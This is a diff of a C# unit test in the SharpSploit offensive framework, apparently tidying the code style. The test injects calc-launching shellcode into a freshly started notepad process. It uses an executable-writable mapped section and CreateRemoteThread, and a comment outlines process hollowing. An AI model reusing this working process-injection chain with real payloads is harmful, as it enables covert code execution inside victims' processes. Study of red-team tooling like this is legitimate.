@@ -1,10 +1,13 @@
 ﻿using System;
+using System.Diagnostics;
+
+using Microsoft.VisualStudio.TestTools.UnitTesting;
+
+using SharpSploit.Enumeration;
 using SharpSploit.Execution;
 using SharpSploit.Execution.Injection;
-using Microsoft.VisualStudio.TestTools.UnitTesting;
-using System.Management;
 
-namespace SharpSploit.Framework.Tests.Execution.Injection
+namespace SharpSploit.Tests.Execution.Injection
 {
     [TestClass]
     public class InjectionTests
@@ -50,42 +53,37 @@ namespace SharpSploit.Framework.Tests.Execution.Injection
                 0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00
             };
 
-            //These options could also be passed in as optional parameters in the constructors
+            // These options could also be passed in as optional parameters in the constructors
 
-            RemoteThreadCreate injectionTechnique = new RemoteThreadCreate();
-            injectionTechnique.api = RemoteThreadCreate.APIS.CreateRemoteThread;
-            injectionTechnique.suspended = false;
-
-            SectionMapAlloc allocationTechnique = new SectionMapAlloc();
-
-            allocationTechnique.localSectionPermissions = Win32.WinNT.PAGE_READWRITE;
-            allocationTechnique.remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
-            allocationTechnique.sectionAttributes = Win32.WinNT.SEC_COMMIT;
-
-            PICPayload payload;
-
-            System.Diagnostics.Process notepadProcess = System.Diagnostics.Process.Start("notepad.exe");
-
-            //check the architecture of the process
-            if (SharpSploit.Enumeration.Host.IsWow64(notepadProcess))
+            RemoteThreadCreate injectionTechnique = new RemoteThreadCreate
             {
-                payload = new PICPayload(calc32bitShellCode);
+                api = RemoteThreadCreate.APIS.CreateRemoteThread,
+                suspended = false
+            };
 
-            }
-            else
+            SectionMapAlloc allocationTechnique = new SectionMapAlloc
             {
-                payload = new PICPayload(calc64bitShellCode);
-            }
+                localSectionPermissions = Win32.WinNT.PAGE_READWRITE,
+                remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE,
+                sectionAttributes = Win32.WinNT.SEC_COMMIT
+            };
+
+
+            Process notepadProcess = Process.Start("notepad.exe");
+
+            // Check the architecture of the process
+            PICPayload payload = Host.IsWow64(notepadProcess) ? new PICPayload(calc32bitShellCode) : new PICPayload(calc64bitShellCode);
 
             IntPtr payloadLocation = allocationTechnique.Allocate(payload, notepadProcess);
 
-            //For every payload type, both the injectionTechnique and the allocationTechnique would have overloads of Inject() and Allocate() that handle logic relevant to the specific payload type
+            // For every payload type, both the injectionTechnique and the allocationTechnique would have
+            // overloads of Inject() and Allocate() that handle logic relevant to the specific payload type
 
-            //Perform injection using the magic of OOP polymorphism and function overloads!
+            // Perform injection using the magic of OOP polymorphism and function overloads!
             Assert.IsTrue(Injector.Inject(payload, allocationTechnique, injectionTechnique, notepadProcess));
 
-            //If this code were for Process Hollowing, you could use the Allocate function in your Allocation Technique on your new, suspended process. Then overwrite the PEB appropriately.
-            //	Point being, Techniques like that that rely on complex logic beyond simple primitives would be implemented in separate classes, leveraging the Injection API as useful.
+            // If this code were for Process Hollowing, you could use the Allocate function in your Allocation Technique on your new, suspended process. Then overwrite the PEB appropriately.
+            // Point being, Techniques like that that rely on complex logic beyond simple primitives would be implemented in separate classes, leveraging the Injection API as useful.
         }
     }
 }
